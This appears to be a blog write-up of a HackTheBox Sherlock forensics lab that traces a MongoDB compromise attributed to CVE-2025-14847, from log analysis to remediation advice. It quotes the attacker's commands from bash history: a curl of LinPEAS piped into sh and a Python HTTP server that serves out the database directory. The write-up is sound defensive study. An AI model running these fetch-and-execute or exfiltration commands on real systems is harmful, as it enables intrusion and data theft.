---
title: "MangoBleed — Incident Investigation of a MongoDB Zero-Day Exploit"
categories: [DFIR, HackTheBox Sherlock]
tags: [dfir, mongodb, linux, incident-response, cve-2025-14847]
toc: false
---

<div class="lockgate" id="gate-mango">
  <div class="lockgate-term">
    <div class="lockgate-bar"><span></span><span></span><span></span></div>
    <div class="lockgate-body">
      <div>$ cat access_status.log</div>
      <div style="margin:8px 0 4px;">This writeup is restricted. Enter the access code to view the full investigation.</div>
      <div class="lockgate-row">
        <span>$</span>
        <input type="password" id="input-mango" placeholder="enter access code" autocomplete="off">
      </div>
      <button onclick="unlockMango()">UNLOCK WRITEUP</button>
      <div id="status-mango" class="status-line"></div>
    </div>
  </div>
  <p class="lockgate-note">Don't have a code? Reach out and I'll send you access.</p>
</div>

<div id="content-mango" style="display:none;" markdown="1">

## Scenario

A secondary MongoDB server (`mongodbsync`), maintained only once a month, was flagged by its administrator after they became aware of a vulnerability nicknamed **MongoBleed**. Root-level access to a UAC triage acquisition of the host was provided to determine whether the system had been compromised, and to reconstruct the full attack chain.

## Machine overview

| Field | Value |
|---|---|
| Platform | HackTheBox Sherlock |
| Difficulty | Very Easy |
| Artifact type | UAC Linux triage collection |
| CVE exploited | CVE-2025-14847 ("MongoBleed") |
| Vulnerable service | MongoDB 8.0.16 |
| Attack vector | Unauthenticated memory disclosure → credential leak → SSH brute force → privilege escalation → exfiltration |

## Phase 1: Environment setup

Working from Windows via WSL, the first task was locating and extracting the evidence archive.

```bash
grep -i "version" "[root]/var/log/mongodb/mongod.log" | head -5
```

```
"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16", ...
```

**Finding:** MongoDB 8.0.16 — squarely inside CVE-2025-14847's vulnerable range (8.0.0 through 8.0.16).

## Phase 2: The root cause

```bash
cat "[root]/etc/mongod.conf"
```

```
net:
  port: 27017
  bindIp: 0.0.0.0

#security:
```

**Finding:** bound to all interfaces, authentication never enabled.

## Phase 3: Identifying the attacker

```bash
grep -oP '"remote":"\K[0-9.]+' mongod.log | sort | uniq -c | sort -rn
```

```
75260 65.0.76.43
```

**Finding:** every one of 75,260 connections came from a single IP — no legitimate traffic mixed in. Earliest event: `2025-12-29 05:25:52 UTC`.

## Phase 4: From exploit to interactive access

```bash
grep "65.0.76.43" auth.log | grep -i "fail" | wc -l
```

```
76
```

Two "Accepted" logins appeared — one closing in under a second (automated), the other staying open with follow-on activity.

**Finding:** genuine interactive access confirmed at `2025-12-29 05:40:03 UTC`.

## Phase 5: Privilege escalation

```bash
cat "[root]/home/mongoadmin/.bash_history"
```

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Finding:** LinPEAS executed entirely in memory via pipe — no file ever touched disk. Root access followed minutes later from a separate IP.

## Phase 6: Data access and exfiltration

```bash
cd /var/lib/mongodb/
python3 -m http.server 6969
```

**Finding:** MongoDB's raw data directory targeted, served out via an ad hoc Python HTTP server.

## Attack chain summary

1. **Initial access** — unauthenticated exploitation of CVE-2025-14847 against an auth-disabled, internet-facing MongoDB instance
2. **Credential exposure** — memory disclosure leaked mongoadmin credentials
3. **Lateral movement** — 76 SSH brute-force attempts, successful session at 05:40:03 UTC
4. **Privilege escalation** — in-memory LinPEAS scan, root obtained via a separate IP minutes later
5. **Data access / exfiltration** — targeted `/var/lib/mongodb`, served via Python HTTP server

## Recommendations

- Patch MongoDB to 8.0.17+ immediately
- Enable and enforce MongoDB authentication
- Restrict `bindIp` to trusted internal addresses only
- Rotate all credentials associated with the compromised account
- Restrict outbound network access from database hosts
- Rebuild the host from a known-good image rather than remediate in place

</div>

<script>
(function(){
  async function sha256(text){
    const enc = new TextEncoder().encode(text);
    const buf = await crypto.subtle.digest('SHA-256', enc);
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
  }
  // SHA-256 hash of the access code. Default code: mangobleed2026
  // To change it: python3 -c "import hashlib; print(hashlib.sha256('yourcode'.encode()).hexdigest())"
  const CODE_HASH = "0cf3d7a1efaa12a1de5d18d17bf1e31eb1351f01e92effcb0c198adb9de25f4e";

  const input = document.getElementById('input-mango');
  input.addEventListener('keydown', function(e){ if(e.key === 'Enter') unlockMango(); });

  window.unlockMango = async function(){
    const status = document.getElementById('status-mango');
    const code = input.value.trim();
    if(!code){
      status.textContent = 'error: access code required';
      status.className = 'status-line err';
      return;
    }
    status.textContent = 'verifying...';
    status.className = 'status-line';
    const hash = await sha256(code);
    if(hash === CODE_HASH){
      status.textContent = 'access granted — decrypting writeup...';
      status.className = 'status-line ok';
      setTimeout(function(){
        document.getElementById('gate-mango').style.display = 'none';
        document.getElementById('content-mango').style.display = 'block';
      }, 500);
    } else {
      status.textContent = 'access denied: incorrect code';
      status.className = 'status-line err';
    }
  };
})();
</script>
